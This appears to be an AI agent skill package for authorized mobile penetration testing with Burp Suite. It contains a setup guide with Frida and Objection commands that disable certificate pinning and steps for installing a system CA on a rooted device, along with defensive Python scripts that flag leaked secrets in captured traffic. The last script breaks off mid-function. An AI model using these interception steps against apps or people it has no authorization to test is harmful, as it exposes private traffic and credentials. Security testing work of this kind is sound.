===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/SKILL.md =====
---
name: intercepting-mobile-traffic-with-burpsuite
description: 'Intercepts and analyzes HTTP/HTTPS traffic from mobile applications
  using Burp Suite proxy to identify insecure API communications, authentication flaws,
  data leakage, and server-side vulnerabilities. Use when performing mobile application
  penetration testing, assessing API security, or evaluating client-server communication
  patterns. Activates for requests involving mobile traffic interception, Burp Suite
  mobile proxy, API security testing, or mobile HTTPS analysis.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- ios
- burp-suite
- traffic-interception
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
---
# Intercepting Mobile Traffic with Burp Suite

## When to Use

Use this skill when:
- Testing mobile application API endpoints for authentication, authorization, and injection vulnerabilities
- Analyzing data transmitted between mobile apps and backend servers during penetration tests
- Evaluating certificate pinning implementations and their bypass difficulty
- Identifying sensitive data leakage in mobile network traffic

**Do not use** this skill to intercept traffic from applications you are not authorized to test -- traffic interception without authorization violates computer fraud laws.

## Prerequisites

- Burp Suite Professional or Community Edition installed on testing workstation
- Android device/emulator or iOS device on the same network as Burp Suite host
- Burp Suite CA certificate installed on the target device
- For Android 7+: Network security config modification or Magisk module for system CA trust
- For SSL pinning bypass: Frida + Objection or custom Frida scripts
- Wi-Fi network where proxy configuration is possible

## Workflow

### Step 1: Configure Burp Suite Proxy Listener

```
Burp Suite > Proxy > Options > Proxy Listeners:
- Bind to address: All interfaces (or specific IP)
- Bind to port: 8080
- Enable "Support invisible proxying"
```

Verify the listener is active and note the workstation's IP address on the shared network.

### Step 2: Configure Mobile Device Proxy

**Android:**
```
Settings > Wi-Fi > [Network] > Advanced > Manual Proxy
- Host: <burp_workstation_ip>
- Port: 8080
```

**iOS:**
```
Settings > Wi-Fi > [Network] > Configure Proxy > Manual
- Server: <burp_workstation_ip>
- Port: 8080
```

### Step 3: Install Burp Suite CA Certificate

**Android (below API 24):**
```bash
# Export Burp CA from Proxy > Options > Import/Export CA Certificate
# Transfer to device and install via Settings > Security > Install from storage
```

**Android (API 24+ / Android 7+):**
Apps targeting API 24+ do not trust user-installed CAs by default. Options:
```bash
# Option A: Modify app's network_security_config.xml (requires APK rebuild)
# Add to res/xml/network_security_config.xml:
# <network-security-config>
#   <debug-overrides>
#     <trust-anchors>
#       <certificates src="user" />
#     </trust-anchors>
#   </debug-overrides>
# </network-security-config>

# Option B: Install as system CA (rooted device)
openssl x509 -inform DER -in burp-ca.der -out burp-ca.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1)
cp burp-ca.pem "$HASH.0"
adb push "$HASH.0" /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/$HASH.0

# Option C: Magisk module (MagiskTrustUserCerts)
```

**iOS:**
```
1. Navigate to http://<burp_ip>:8080 in Safari
2. Download Burp CA certificate
3. Settings > General > VPN & Device Management > Install profile
4. Settings > General > About > Certificate Trust Settings > Enable full trust
```

### Step 4: Intercept and Analyze Traffic

With proxy configured, open the target app and navigate through its functionality:

**Burp Suite > Proxy > HTTP History**: Review all captured requests and responses.

Key areas to analyze:
- **Authentication tokens**: JWT structure, token expiration, refresh mechanisms
- **API endpoints**: RESTful paths, GraphQL queries, parameter patterns
- **Sensitive data in transit**: PII, credentials, financial data
- **Response headers**: Security headers (HSTS, CSP, X-Frame-Options)
- **Error responses**: Stack traces, debug information, internal paths

### Step 5: Test API Vulnerabilities Using Burp Repeater

Forward intercepted requests to Repeater for manual testing:

```
Right-click request > Send to Repeater

Test categories:
- Authentication bypass: Remove/modify auth tokens
- IDOR: Modify user IDs, object references
- Injection: SQL injection, NoSQL injection in parameters
- Rate limiting: Rapid request replay for brute force assessment
- Business logic: Modify prices, quantities, permissions in requests
```

### Step 6: Automate Testing with Burp Scanner

```
Right-click request > Do active scan (Professional only)

Scanner checks:
- SQL injection (error-based, blind, time-based)
- XSS (reflected, stored)
- Command injection
- Path traversal
- XML/JSON injection
- Authentication flaws
```

### Step 7: Handle Certificate Pinning

If traffic is not visible due to certificate pinning:

```bash
# Frida-based bypass (generic)
frida -U -f com.target.app -l ssl-pinning-bypass.js

# Objection bypass
objection --gadget com.target.app explore
ios sslpinning disable  # or
android sslpinning disable
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **MITM Proxy** | Man-in-the-middle proxy that terminates and re-establishes TLS connections to inspect encrypted traffic |
| **Certificate Pinning** | Client-side validation that restricts accepted server certificates beyond the OS trust store |
| **Network Security Config** | Android XML configuration controlling app trust anchors, cleartext traffic policy, and certificate pinning |
| **Invisible Proxying** | Burp feature handling non-proxy-aware clients that don't send CONNECT requests |
| **IDOR** | Insecure Direct Object Reference -- accessing resources by manipulating identifiers without authorization checks |

## Tools & Systems

- **Burp Suite Professional**: Full-featured web application security testing proxy with active scanner
- **Burp Suite Community**: Free version with manual interception and basic tools
- **Frida**: Dynamic instrumentation for runtime SSL pinning bypass
- **mitmproxy**: Open-source alternative to Burp Suite for programmatic traffic analysis
- **Charles Proxy**: Alternative HTTP proxy with mobile-friendly certificate installation

## Common Pitfalls

- **Android 7+ CA trust**: User-installed certificates are not trusted by apps targeting API 24+. Must use system CA installation or app modification.
- **Certificate transparency**: Some apps use Certificate Transparency logs to detect MITM. Check for CT enforcement in the app.
- **Non-HTTP protocols**: Burp Suite only handles HTTP/HTTPS. Use Wireshark for WebSocket, MQTT, gRPC, or custom binary protocols.
- **VPN-based apps**: Apps using VPN tunnels bypass device proxy settings. May need iptables rules on a rooted device to redirect traffic.

===== END FILE =====


===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/assets/template.md =====
# Mobile Traffic Interception Assessment Report

## Engagement Information

| Field | Value |
|-------|-------|
| Application | [APP_NAME] |
| Platform | [Android/iOS] |
| Proxy Tool | Burp Suite [VERSION] |
| Assessment Date | [DATE] |
| Total Requests Captured | [COUNT] |
| Unique Endpoints | [COUNT] |

## API Surface Map

| Method | Endpoint | Auth Required | Description |
|--------|----------|---------------|-------------|
| [METHOD] | [PATH] | [YES/NO] | [DESCRIPTION] |

## Traffic Security Findings

### Finding [N]: [TITLE]

- **Severity**: [CRITICAL/HIGH/MEDIUM/LOW]
- **OWASP Mobile**: [M1-M10]
- **CWE**: [CWE-ID]
- **Affected Endpoint**: [URL]
- **Description**: [DESCRIPTION]
- **Evidence**: [REQUEST/RESPONSE_SNIPPET]
- **Recommendation**: [REMEDIATION]

## Authentication Analysis

| Check | Result | Details |
|-------|--------|---------|
| Token Format | [JWT/Opaque/Other] | [DETAILS] |
| Token Expiration | [DURATION] | [DETAILS] |
| Token in URL | [YES/NO] | [DETAILS] |
| Refresh Mechanism | [Present/Absent] | [DETAILS] |
| Session Invalidation | [Works/Fails] | [DETAILS] |

## Security Header Compliance

| Header | Present | Value | Status |
|--------|---------|-------|--------|
| Strict-Transport-Security | [YES/NO] | [VALUE] | [PASS/FAIL] |
| Content-Security-Policy | [YES/NO] | [VALUE] | [PASS/FAIL] |
| X-Content-Type-Options | [YES/NO] | [VALUE] | [PASS/FAIL] |
| Cache-Control | [YES/NO] | [VALUE] | [PASS/FAIL] |

## Recommendations

1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/references/api-reference.md =====
# API Reference: Mobile Traffic Interception with Burp Suite

## HAR (HTTP Archive) Format

### Structure
```json
{"log": {"entries": [{"request": {"method": "GET", "url": "https://...",
  "headers": [{"name": "Authorization", "value": "Bearer ..."}],
  "postData": {"text": "..."}},
  "response": {"status": 200, "headers": [...],
  "content": {"text": "..."}}}]}}
```

### Key HAR Fields
| Field | Description |
|-------|-------------|
| `request.url` | Full request URL |
| `request.method` | HTTP method |
| `request.headers` | Request headers array |
| `request.postData.text` | POST body content |
| `response.status` | HTTP status code |
| `response.content.text` | Response body |

## Burp Suite Proxy Setup for Mobile
1. Set proxy listener: `127.0.0.1:8080`
2. Configure device WiFi proxy to Burp IP:8080
3. Install Burp CA: `http://burp/cert`
4. Export traffic as HAR: Proxy > HTTP History > Save Items

## mitmproxy Alternative
```bash
mitmproxy --mode regular --listen-port 8080
mitmdump -w output.flow --set flow_detail=3
# Convert to HAR:
mitmproxy2har output.flow > capture.har
```

## Certificate Pinning Bypass
| Platform | Tool |
|----------|------|
| Android | Frida + objection (`objection explore --startup-command 'android sslpinning disable'`) |
| iOS | SSL Kill Switch 2 (Cydia) |

## Sensitive Data Patterns
| Type | Regex Pattern |
|------|---------------|
| Email | `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}` |
| Credit Card | `\b(?:4\d{3}|5[1-5]\d{2})\d{12}\b` |
| JWT | `eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+` |

## References
- Burp Suite: https://portswigger.net/burp/documentation
- HAR spec: https://w3c.github.io/web-performance/specs/HAR/Overview.html
- mitmproxy: https://docs.mitmproxy.org/stable/

===== END FILE =====


===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/references/standards.md =====
# Standards Reference: Mobile Traffic Interception with Burp Suite

## OWASP Mobile Top 10 2024 Mapping

| OWASP ID | Risk | Burp Suite Testing Coverage |
|----------|------|----------------------------|
| M1 | Improper Credential Usage | Identify credentials in plaintext, weak token formats in API traffic |
| M3 | Insecure Authentication/Authorization | Test auth bypass, session management, IDOR via request manipulation |
| M4 | Insufficient Input/Output Validation | SQL injection, XSS, command injection via Burp Scanner/Repeater |
| M5 | Insecure Communication | Detect cleartext HTTP, weak TLS, missing HSTS, certificate validation |
| M8 | Security Misconfiguration | Identify verbose error messages, debug endpoints, missing security headers |

## OWASP MASVS v2.0 Control Mapping

| MASVS Category | Burp Suite Assessment | Test Method |
|----------------|----------------------|-------------|
| MASVS-NETWORK | TLS configuration, certificate pinning, cleartext detection | Proxy interception, SSL scan |
| MASVS-AUTH | Token validation, session handling, credential transmission | Repeater manipulation |
| MASVS-STORAGE | Sensitive data in API responses cached client-side | Response header analysis |
| MASVS-PLATFORM | Deep link parameter injection, WebView URL loading | Request crafting |

## OWASP API Security Top 10 2023

| API Risk | Burp Suite Test |
|----------|----------------|
| API1: Broken Object Level Authorization | Modify object IDs in intercepted requests |
| API2: Broken Authentication | Replay tokens, test token expiration |
| API3: Broken Object Property Level Auth | Modify response/request properties |
| API5: Broken Function Level Authorization | Access admin endpoints with user tokens |
| API8: Security Misconfiguration | Check response headers, error handling |

## CWE Mappings

| CWE ID | Title | Detection Method |
|--------|-------|-----------------|
| CWE-200 | Exposure of Sensitive Information | Inspect API responses for data leakage |
| CWE-295 | Improper Certificate Validation | Test with self-signed proxy certificate |
| CWE-319 | Cleartext Transmission | Monitor for HTTP (non-HTTPS) requests |
| CWE-352 | Cross-Site Request Forgery | Check for anti-CSRF tokens in requests |
| CWE-613 | Insufficient Session Expiration | Test token validity after logout |

===== END FILE =====


===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/references/workflows.md =====
# Workflows: Mobile Traffic Interception with Burp Suite

## Workflow 1: Standard Mobile API Testing

```
[Configure Burp Listener] --> [Set Device Proxy] --> [Install CA Cert] --> [Open Target App]
                                                                                |
                                                                                v
                                                                     [Capture HTTP History]
                                                                                |
                                                          +---------------------+---------------------+
                                                          |                     |                     |
                                                   [Map API surface]    [Identify auth flow]   [Check data exposure]
                                                          |                     |                     |
                                                          v                     v                     v
                                                   [Send to Scanner]    [Token analysis]       [PII in responses]
                                                   [Active scan]        [Session testing]      [Sensitive headers]
                                                          |                     |                     |
                                                          +---------------------+---------------------+
                                                                                |
                                                                         [Compile findings]
                                                                         [Generate report]
```

## Workflow 2: SSL Pinning Bypass Pipeline

```
[Set Proxy] --> [Open App] --> [Connection fails?]
                                    |
                              [Yes: Pinning active]
                                    |
                     +--------------+--------------+
                     |              |              |
              [Frida bypass]  [Objection]   [APK repackage]
              [Generic script] [sslpinning] [Remove pinning code]
                     |         [disable]          |
                     +--------------+--------------+
                                    |
                           [Verify traffic flows]
                           [Continue assessment]
```

## Workflow 3: Authentication Testing

```
[Intercept login request] --> [Capture auth token] --> [Analyze token format]
                                                              |
                                                   +----------+----------+
                                                   |                     |
                                            [JWT analysis]        [Opaque token]
                                            [Decode payload]      [Session management]
                                            [Check signature]     [Timeout testing]
                                            [Modify claims]       [Concurrent session]
                                                   |                     |
                                                   +----------+----------+
                                                              |
                                                    [Test IDOR with user IDs]
                                                    [Test privilege escalation]
                                                    [Test token replay after logout]
```

## Decision Matrix: Traffic Interception Approach

| Scenario | Android | iOS |
|----------|---------|-----|
| No pinning, API < 24 | Standard proxy + user CA | Standard proxy + profile install |
| No pinning, API 24+ | System CA or network_security_config mod | Standard proxy + profile install |
| Pinning implemented | Frida/Objection bypass + system CA | Frida/Objection bypass |
| Custom protocol | Wireshark + custom Frida hooks | Wireshark + custom Frida hooks |
| VPN tunnel | iptables redirect on rooted device | Not feasible without jailbreak |

===== END FILE =====


===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for analyzing intercepted mobile app traffic via mitmproxy for security testing."""

import json
import argparse
import re
from datetime import datetime
from urllib.parse import urlparse


def load_har_file(har_path):
    """Load and parse an HTTP Archive (HAR) file from proxy capture."""
    with open(har_path) as f:
        data = json.load(f)
    entries = data.get("log", {}).get("entries", [])
    print(f"[*] Loaded {len(entries)} requests from {har_path}")
    return entries


def find_insecure_requests(entries):
    """Identify HTTP (non-HTTPS) requests from mobile app."""
    findings = []
    for e in entries:
        url = e.get("request", {}).get("url", "")
        if url.startswith("http://"):
            findings.append({"url": url, "method": e["request"].get("method"),
                             "issue": "Cleartext HTTP request", "severity": "HIGH"})
    print(f"\n[*] Insecure HTTP requests: {len(findings)}")
    for f in findings[:10]:
        print(f"  [!] {f['method']} {f['url'][:80]}")
    return findings


def detect_sensitive_data_leakage(entries):
    """Scan request/response bodies for sensitive data patterns."""
    patterns = {
        "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "phone": r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b",
        "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
        "credit_card": r"\b(?:4\d{3}|5[1-5]\d{2}|3[47]\d{2}|6011)\d{12}\b",
        "api_key": r"(?:api[_-]?key|apikey|token)[\"']?\s*[:=]\s*[\"']?([a-zA-Z0-9_-]{20,})",
        "jwt": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
    }
    findings = []
    for e in entries:
        url = e.get("request", {}).get("url", "")
        body = e.get("request", {}).get("postData", {}).get("text", "")
        resp_body = e.get("response", {}).get("content", {}).get("text", "")
        combined = f"{body} {resp_body}"
        for name, pattern in patterns.items():
            matches = re.findall(pattern, combined)
            if matches:
                findings.append({"url": url[:80], "data_type": name,
                                 "count": len(matches), "severity": "HIGH"})
    print(f"\n[*] Sensitive data leakage findings: {len(findings)}")
    for f in findings[:10]:
        print(f"  [!] {f['data_type']} in {f['url']} ({f['count']} occurrences)")
    return findings


def check_auth_headers(entries):
    """Analyze authentication headers and token handling."""
    findings = []
    for e in entries:
        headers = {h["name"].lower(): h["value"] for h in e.get("request", {}).get("headers", [])}
        url = e.get("request", {}).get("url", "")
        if "authorization" in headers:
            auth = headers["authorization"]
            if auth.startswith("Basic "):
                findings.append({"url": url[:80], "issue": "Basic auth over network",
                                 "severity": "HIGH"})
            elif auth.startswith("Bearer "):
                token = auth.split(" ", 1)[1]
                if len(token) < 20:
                    findings.append({"url": url[:80], "issue": "Short bearer token",
                                     "severity": "MEDIUM"})
        resp_headers = {h["name"].lower(): h["value"]
                        for h in e.get("response", {}).get("headers", [])}
        if "set-cookie" in resp_headers:
            cookie = resp_headers["set-cookie"]
            if "secure" not in cookie.lower() or "httponly" not in cookie.lower():
                findings.append({"url": url[:80], "issue": "Cookie missing Secure/HttpOnly",
                                 "severity": "MEDIUM"})
    print(f"\n[*] Auth/cookie findings: {len(findings)}")
    return findings


def check_certificate_pinning(entries):
    """Check for certificate pinning indicators in traffic."""
    domains = set()
    for e in entries:
        url = e.get("request", {}).get("url", "")
        parsed = urlparse(url)
        if parsed.scheme == "https":
            domains.add(parsed.hostname)
    print(f"\n[*] HTTPS domains contacted: {len(domains)}")
    for d in sorted(domains)[:20]:
        print(f"  {d}")
    print("  [*] Note: Certificate pinning bypass verified by successful interception")
    return list(domains)


def check_api_security_headers(entries):
    """Check API response security headers."""
    findings = []
    checked_hosts = set()
    for e in entries:
        url = e.get("request", {}).get("url", "")
        host = urlparse(url).hostname
        if host in checked_hosts:
            continue
        checked_hosts.add(host)
        resp_headers = {h["name"].lower(): h["value"]
                        for h in e.get("response", {}).get("headers", [])}
        missing = []
        for hdr in ["strict-transport-security", "x-content-type-options",
                     "x-frame-options", "content-security-policy"]:
            if hdr not in resp_headers:
                missing.append(hdr)
        if missing:
            findings.append({"host": host, "missing_headers": missing, "severity": "MEDIUM"})
    print(f"\n[*] Security header findings: {len(findings)}")
    return findings


def generate_report(all_findings, output_path):
    """Generate mobile traffic analysis report."""
    report = {"analysis_date": datetime.now().isoformat(), "total_findings": len(all_findings),
              "findings": all_findings}
    with open(output_path, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"\n[*] Report saved to {output_path}")


def main():
    parser = argparse.ArgumentParser(description="Mobile Traffic Interception Analysis Agent")
    parser.add_argument("action", choices=["analyze", "insecure", "leakage", "auth", "full"])
    parser.add_argument("--har", required=True, help="Path to HAR file from proxy capture")
    parser.add_argument("-o", "--output", default="mobile_traffic_report.json")
    args = parser.parse_args()

    entries = load_har_file(args.har)
    findings = []
    if args.action in ("insecure", "full"):
        findings.extend(find_insecure_requests(entries))
    if args.action in ("leakage", "full"):
        findings.extend(detect_sensitive_data_leakage(entries))
    if args.action in ("auth", "full"):
        findings.extend(check_auth_headers(entries))
    if args.action in ("analyze", "full"):
        check_certificate_pinning(entries)
        findings.extend(check_api_security_headers(entries))
    if args.action == "full":
        generate_report(findings, args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/intercepting-mobile-traffic-with-burpsuite/scripts/process.py =====
#!/usr/bin/env python3
"""
Mobile Traffic Analysis Pipeline for Burp Suite Exports

Parses Burp Suite XML export files to identify security findings in mobile API traffic.
Analyzes authentication patterns, sensitive data exposure, and security header compliance.

Usage:
    python process.py --burp-xml export.xml [--output report.json]
"""

import argparse
import json
import sys
import base64
import re
import xml.etree.ElementTree as ET
from collections import Counter
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qs


class BurpTrafficAnalyzer:
    """Analyzes Burp Suite XML exports for mobile security findings."""

    SENSITIVE_PATTERNS = {
        "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "phone": r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b",
        "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
        "credit_card": r"\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b",
        "jwt": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
        "api_key": r"(?:api[_-]?key|apikey)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_-]{20,})",
        "bearer_token": r"Bearer\s+[a-zA-Z0-9_.-]+",
    }

    SECURITY_HEADERS = [
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Content-Type-Options",
        "X-Frame-Options",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Cache-Control",
    ]

    def __init__(self, xml_path: str):
        self.xml_path = xml_path
        self.requests = []
        self.findings = []

    def parse_burp_xml(self) -> int:
        """Parse Burp Suite XML export file."""
        tree = ET.parse(self.xml_path)
        root = tree.getroot()

        for item in root.findall(".//item"):
            request_data = {
                "url": item.findtext("url", ""),
                "host": item.findtext("host", ""),
                "port": item.findtext("port", ""),
                "protocol": item.findtext("protocol", ""),
                "method": item.findtext("method", ""),
                "path": item.findtext("path", ""),
                "status": item.findtext("status", ""),
                "mime_type": item.findtext("mimetype", ""),
            }

            # Decode request
            req_elem = item.find("request")
            if req_elem is not None and req_elem.text:
                is_base64 = req_elem.get("base64", "false") == "true"
                request_data["request_body"] = (
                    base64.b64decode(req_elem.text).decode("utf-8", errors="replace")
                    if is_base64 else req_elem.text
                )
            else:
                request_data["request_body"] = ""

            # Decode response
            resp_elem = item.find("response")
            if resp_elem is not None and resp_elem.text:
                is_base64 = resp_elem.get("base64", "false") == "true"
                request_data["response_body"] = (
                    base64.b64decode(resp_elem.text).decode("utf-8", errors="replace")
                    if is_base64 else resp_elem.text
                )
            else:
                request_data["response_body"] = ""

            self.requests.append(request_data)

        return len(self.requests)

    def analyze_cleartext_traffic(self) -> list:
        """Identify HTTP (non-HTTPS) traffic."""
        cleartext = [
            r for r in self.requests
            if r["protocol"].lower() == "http"
        ]

        if cleartext:
            self.findings.append({
                "type": "cleartext_traffic",
                "severity": "HIGH",
                "owasp_mobile": "M5",
                "count": len(cleartext),
                "urls": list(set(r["url"] for r in cleartext))[:10],
                "description": f"{len(cleartext)} requests sent over unencrypted HTTP",
            })
        return cleartext

    def analyze_sensitive_data(self) -> list:
        """Scan traffic for sensitive data patterns."""
        sensitive_findings = []

        for req in self.requests:
            combined_text = req.get("response_body", "") + req.get("request_body", "")
            for pattern_name, pattern_regex in self.SENSITIVE_PATTERNS.items():
                matches = re.findall(pattern_regex, combined_text)
                if matches:
                    sensitive_findings.append({
                        "url": req["url"],
                        "pattern": pattern_name,
                        "match_count": len(matches),
                        "sample": matches[0][:20] + "..." if matches else "",
                    })

        if sensitive_findings:
            self.findings.append({
                "type": "sensitive_data_exposure",
                "severity": "HIGH",
                "owasp_mobile": "M9",
                "count": len(sensitive_findings),
                "details": sensitive_findings[:20],
                "description": f"Sensitive data patterns found in {len(sensitive_findings)} request/response pairs",
            })
        return sensitive_findings

    def analyze_security_headers(self) -> dict:
        """Check for missing security headers in responses."""
        header_coverage = {h: 0 for h in self.SECURITY_HEADERS}
        total_responses = 0

        for req in self.requests:
            resp = req.get("response_body", "")
            if resp:
                total_responses += 1
                for header in self.SECURITY_HEADERS:
                    if header.lower() in resp.lower():
                        header_coverage[header] += 1

        missing = [h for h, count in header_coverage.items() if count == 0]

        if missing:
            self.findings.append({
                "type": "missing_security_headers",
                "severity": "MEDIUM",
                "owasp_mobile": "M8",
                "missing_headers": missing,
                "total_responses": total_responses,
